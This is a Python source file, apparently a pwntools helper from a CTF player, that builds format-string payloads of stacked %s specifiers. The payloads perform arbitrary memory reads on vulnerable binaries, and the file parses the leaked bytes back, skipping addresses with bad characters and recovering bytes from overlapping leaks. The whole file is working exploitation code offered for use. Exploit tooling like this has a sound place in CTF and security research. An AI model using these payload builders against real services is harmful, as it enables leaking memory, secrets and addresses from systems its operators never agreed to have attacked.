"""
FmtStrReader - Arbitrary memory reads via format string %s payloads.

Handles the tricky parts of using %s for format string reads:
  - %s stops at null bytes, so we send multiple %s (one per byte offset)
  - Addresses containing bad characters (e.g. \\n) are skipped
  - Overlapping leak windows let us recover skipped bytes when possible
  - Start/end sentinels let you find the leak in noisy output

Usage:
    from pwn import *
    reader = FmtStrReader(offset=6)
    leak = reader.payload(0x404060, count=8)
    raw = p.sendlineafter(b"> ", bytes(leak))
    data = reader.parse(raw)
"""

# NEEDS MORE TESTING BUT SEEMS TO WORK
# ADAPATED FROM MY DUMPELF WRITEUP
# WILL CHANGE WRITEUP TO USE THIS EVENTUALLY
# HAVE NOT TESTED BULK WRITES


from pwnlib.context import context
from pwnlib.log import getLogger
from pwnlib.util.packing import pack as _pwn_pack
import string
import struct
import logging

log = getLogger(__name__)

def _pack_addr(addr):
    """Pack an address using the current pwntools context (arch/endian)."""
    return _pwn_pack(addr, word_size=context.bits)

def _word_size():
    return context.bytes


# A short tag is emitted right after start_sentinel so parse() can identify
# which FmtStrLeak a given response belongs to without relying on call order.
# Alphabet is urlsafe-base64 (A-Z a-z 0-9 - _), so the tag is also a base64
# encoding of a monotonic counter -- 64**5 = ~1.07B unique tags per reader.
_TAG_ALPHABET = (
    string.ascii_uppercase + string.ascii_lowercase + string.digits + "-_"
).encode()
_TAG_LEN = 5
_TAG_MAX = 64 ** _TAG_LEN

def _encode_tag(n):
    out = bytearray(_TAG_LEN)
    for i in range(_TAG_LEN - 1, -1, -1):
        out[i] = _TAG_ALPHABET[n & 0x3f]
        n >>= 6
    return bytes(out)

def _decode_tag(tag):
    n = 0
    for b in tag:
        n = (n << 6) | _TAG_ALPHABET.index(b)
    return n

class FmtStrLeak(bytes):
    """
    Returned by FmtStrReader.payload(). A ``bytes`` subclass: it IS the
    payload bytes, and also carries the metadata parse() needs.

    You can pass it directly to anything that accepts bytes (pwntools tubes,
    socket.send, etc.) and inspect ``.addr``, ``.count``, ``.skipped``,
    ``.tag`` for debugging.

    Note: ``bytes`` operations like slicing and concatenation return plain
    ``bytes``, not ``FmtStrLeak`` -- the metadata only lives on the original
    object returned by payload().
    """

    def __new__(cls, payload, *args, **kwargs):
        # bytes is immutable; the byte content has to be set in __new__.
        return bytes.__new__(cls, payload)

    def __init__(
        self,
        payload,
        count,
        skipped,
        delimiter,
        start_sentinel,
        end_sentinel,
        addr,
        tag=None,
    ):
        # bytes.__init__ accepts and ignores any args, so we just stash
        # our metadata on self. The payload arg is unused here -- it was
        # already consumed by __new__.
        self.count = count
        self.skipped = skipped
        self.delimiter = delimiter
        self.start_sentinel = start_sentinel
        self.end_sentinel = end_sentinel
        self.addr = addr
        self.tag = tag

    def __repr__(self):
        skipped_str = f", skipped={sorted(self.skipped)}" if self.skipped else ""
        tag_str = f", tag={self.tag.decode()}" if self.tag else ""
        return (
            f"FmtStrLeak(addr={self.addr:#x}, count={self.count}"
            f"{skipped_str}{tag_str}, len={len(self)})"
        )


class FmtStrReader:
    """
    Builds format string payloads that use multiple %s specifiers to do
    reliable arbitrary reads, and parses the results back into bytes.

    Args:
        offset:    The stack offset where your controlled input begins
                   (same meaning as pwntools FmtStr offset).
        padlen:    Number of bytes before your controlled input in the
                   format string buffer (e.g. if the binary prepends a
                   fixed prefix before your input). Default: 0.
        badchars:  Bytes that cannot appear in addresses placed on the stack.
                   Addresses containing any of these bytes are skipped.
                   Default: b"\\n"
        delimiter: Byte string placed between each %s output so we can split
                   the leak. Should be something unlikely to appear in leaked
                   data. Default: b"FMTLKDLM"
        start_sentinel: Marks the beginning of our leak region in output.
                        Default: b"FMTLKSTART"
        end_sentinel:   Marks the end of our leak region in output.
                        Default: b"FMTLKEND"
        warn:      If True, log warnings when bytes can't be recovered.
                   Default: True

    Note:
        Architecture (32/64-bit, endianness) is taken from pwntools context
        when available. Without pwntools, defaults to 64-bit little-endian.
    """

    def __init__(
        self,
        offset,
        padlen=0,
        badchars=b"\n",
        delimiter=b"FMTLKDLM",
        start_sentinel=b"FMTLKSTART",
        end_sentinel=b"FMTLKEND",
        warn=True,
    ):
        self.offset = offset
        self.padlen = padlen
        self.badchars = set(badchars)
        self.delimiter = delimiter
        self.start_sentinel = start_sentinel
        self.end_sentinel = end_sentinel
        self.warn = warn
        # tag -> FmtStrLeak. parse() looks up the right leak by reading the
        # tag bytes that follow start_sentinel in the response.
        self._leaks = {}
        self._counter = 0

    @property
    def _word_size(self):
        return _word_size()

    def _next_tag(self):
        """Return the next monotonic tag, skipping any whose bytes contain
        a badchar. Raises if the counter space is exhausted."""
        while True:
            if self._counter >= _TAG_MAX:
                raise RuntimeError(
                    "FmtStrReader tag counter exhausted "
                    f"(over {_TAG_MAX} leaks generated)"
                )
            tag = _encode_tag(self._counter)
            self._counter += 1
            if not any(b in self.badchars for b in tag):
                return tag

    def _find_leak_in(self, data):
        """Scan ``data`` for a known tag emitted by this reader. Returns
        ``(leak, start_pos)`` and removes the leak from the registry, or
        ``(None, -1)`` if no known tag is found. Tolerates false-positive
        occurrences of start_sentinel inside leaked memory by continuing
        to scan until a registered tag is matched."""
        sent = self.start_sentinel
        pos = 0
        while True:
            pos = data.find(sent, pos)
            if pos == -1:
                return None, -1
            tag_start = pos + len(sent)
            tag = bytes(data[tag_start:tag_start + _TAG_LEN])
            if tag in self._leaks:
                return self._leaks.pop(tag), pos
            pos += 1

    def payload(self, addr, count=8):
        """
        Build a format string payload to leak ``count`` bytes starting at ``addr``.

        The payload layout is::

            [start_sentinel] [%Ns delim %Ms delim ...] [end_sentinel]
            [null padding to word alignment]
            [packed addr+0] [packed addr+1] ...   (skipping bad addresses)

        The %N values are auto-calculated based on the actual length of the
        format string portion (like pwntools fmtstr_payload), so no fixed
        ljust padding is needed.

        Args:
            addr(int): Starting address to read from.
            count(int): Number of bytes to leak. Default: 8.

        Returns:
            FmtStrLeak: Object whose ``bytes()`` gives the raw payload.
        """
        word_size = self._word_size
        skipped = set()

        # Figure out which byte offsets have bad addresses
        for i in range(count):
            packed = _pack_addr(addr + i)
            if any(b in self.badchars for b in packed):
                skipped.add(i)

        non_skipped = [i for i in range(count) if i not in skipped]
        num_addrs = len(non_skipped)

        if num_addrs == 0:
            if self.warn:
                log.warning(
                    "All %d addresses at %#x contain bad characters. "
                    "Cannot build payload.", count, addr,
                )
            # Empty payload: there's nothing to send and nothing in the
            # response to look up by tag, so we don't register it. The caller
            # has to use parse(leak=...) explicitly if they want to round-trip
            # one of these.
            return FmtStrLeak(
                payload=b"",
                count=count,
                skipped=skipped,
                delimiter=self.delimiter,
                start_sentinel=self.start_sentinel,
                end_sentinel=self.end_sentinel,
                addr=addr,
                tag=None,
            )

        tag = self._next_tag()

        # --- Build the format string prefix ---
        #
        # The prefix looks like:
        #   {start_sentinel}{tag}%A$s{delim}%B$s{delim}...%Z$s{end_sentinel}
        #
        # The %N$ values depend on the prefix length (because the addresses
        # are appended after prefix + alignment padding), but the prefix
        # length depends on %N$ values (more digits = longer string).
        #
        # We solve this iteratively, same approach as pwntools fmtstr_payload.

        def build_prefix(addr_offset_start):
            """Build the format string prefix given the stack word offset
            where the first packed address will land."""
            parts = [self.start_sentinel, tag]
            for idx in range(num_addrs):
                stack_idx = addr_offset_start + idx
                parts.append(f"%{stack_idx}$s".encode())
                if idx < num_addrs - 1:
                    parts.append(self.delimiter)
            parts.append(self.end_sentinel)
            return b"".join(parts)

        # Iteratively solve for the correct offsets.
        guess_offset = self.offset + 20  # arbitrary initial guess
        for _ in range(20):  # converges in 2-3 iterations typically
            prefix = build_prefix(guess_offset)

            # Pad prefix to word alignment, accounting for padlen
            total_prefix = self.padlen + len(prefix)
            remainder = total_prefix % word_size
            if remainder != 0:
                pad_needed = word_size - remainder
            else:
                pad_needed = 0
            padded_prefix_len = len(prefix) + pad_needed

            # The addresses start at this word offset on the stack
            new_offset = self.offset + (self.padlen + padded_prefix_len) // word_size

            if new_offset == guess_offset:
                break
            guess_offset = new_offset
        else:
            log.warning("Offset calculation did not converge; using last value")

        # --- Assemble final payload ---
        prefix = build_prefix(guess_offset)

        # Null-pad to word alignment
        total_prefix = self.padlen + len(prefix)
        remainder = total_prefix % word_size
        if remainder != 0:
            prefix += b"\x00" * (word_size - remainder)

        # Append packed addresses
        addr_section = b"".join(_pack_addr(addr + i) for i in non_skipped)
        final_payload = prefix + addr_section

        leak = FmtStrLeak(
            payload=final_payload,
            count=count,
            skipped=skipped,
            delimiter=self.delimiter,
            start_sentinel=self.start_sentinel,
            end_sentinel=self.end_sentinel,
            addr=addr,
            tag=tag,
        )
        self._leaks[tag] = leak
        return leak

    def parse(self, data, leak=None):
        """
        Parse raw output from the target and extract the leaked bytes.

        Args:
            data(bytes):  The raw bytes received from the target after sending
                          the format string payload.
            leak(FmtStrLeak): The FmtStrLeak object from payload(). If None,
                              identifies the correct leak by reading the
                              5-byte tag emitted right after the start_sentinel.
                              This means leaks generated in any order can be
                              parsed in any order.

        Returns:
            bytes: ``count`` bytes of leaked data. Unrecoverable bytes are \\x00.
        """
        start_pos = -1
        if leak is None:
            leak, start_pos = self._find_leak_in(data)
            if leak is None:
                raise ValueError(
                    "No known leak tag found in data. Call payload() first, "
                    "or pass an explicit leak= argument."
                )
        else:
            # Caller-supplied leak: drop it from the registry if present so
            # it can't also be auto-resolved by a later parse() call.
            if leak.tag is not None:
                self._leaks.pop(leak.tag, None)
                # Prefer a tag-aware match for the start position so we don't
                # lock onto a false-positive start_sentinel inside leaked data.
                start_pos = data.find(leak.start_sentinel + leak.tag)
            if start_pos == -1:
                start_pos = data.find(leak.start_sentinel)

        count = leak.count
        skipped = leak.skipped

        # If everything was skipped, we have nothing
        if len(skipped) == count:
            if self.warn:
                log.warning("All %d bytes unrecoverable at %#x.", count, leak.addr)
            return b"\x00" * count

        # --- Extract the leak region using sentinels ---
        end_search_from = start_pos if start_pos >= 0 else 0
        end_pos = data.find(leak.end_sentinel, end_search_from)

        if start_pos == -1 or end_pos == -1:
            if self.warn:
                log.warning(
                    "Could not find start/end sentinels in output. "
                    "Attempting to parse raw data as-is."
                )
                log.warning(data)
            region = data
        else:
            tag_skip = _TAG_LEN if leak.tag is not None else 0
            region = data[start_pos + len(leak.start_sentinel) + tag_skip:end_pos]

        # --- Split on delimiter ---
        chunks = region.split(leak.delimiter)

        # Build a mapping: byte_position -> chunk from %s
        non_skipped = [i for i in range(count) if i not in skipped]
        chunk_map = {}
        for ci, byte_idx in enumerate(non_skipped):
            if ci < len(chunks):
                chunk_map[byte_idx] = chunks[ci]
            else:
                chunk_map[byte_idx] = b""

        # --- Reconstruct bytes using overlapping leak windows ---
        #
        # If %s at addr+i returned N bytes, then positions i..i+N-1 are all
        # known from that single leak. We track a "cursor" — the farthest-
        # reaching leak — and use it to fill in both normal and skipped
        # positions.

        result = bytearray(count)
        unrecovered = 0
        cursor_start = -1
        cursor_data = b""

        for i in range(count):
            cursor_offset = i - cursor_start
            cursor_covers = (
                cursor_start >= 0
                and cursor_offset < len(cursor_data)
            )

            if i not in skipped:
                chunk = chunk_map.get(i, b"")

                if chunk:
                    result[i] = chunk[0]
                    # Update cursor if this leak reaches farther
                    if not cursor_covers or (i + len(chunk)) > (cursor_start + len(cursor_data)):
                        cursor_start = i
                        cursor_data = chunk
                else:
                    # %s returned empty -> null byte at this address
                    result[i] = 0
            else:
                # Skipped position — try to recover from cursor
                if cursor_covers:
                    result[i] = cursor_data[cursor_offset]
                else:
                    result[i] = 0
                    unrecovered += 1

        if unrecovered > 0 and self.warn:
            log.warning(
                "%d/%d byte(s) at %#x could not be recovered "
                "(addresses contained bad characters and no covering "
                "leak was available). Set to \\x00.",
                unrecovered, count, leak.addr,
            )

        return bytes(result)

__all__ = ["FmtStrReader"]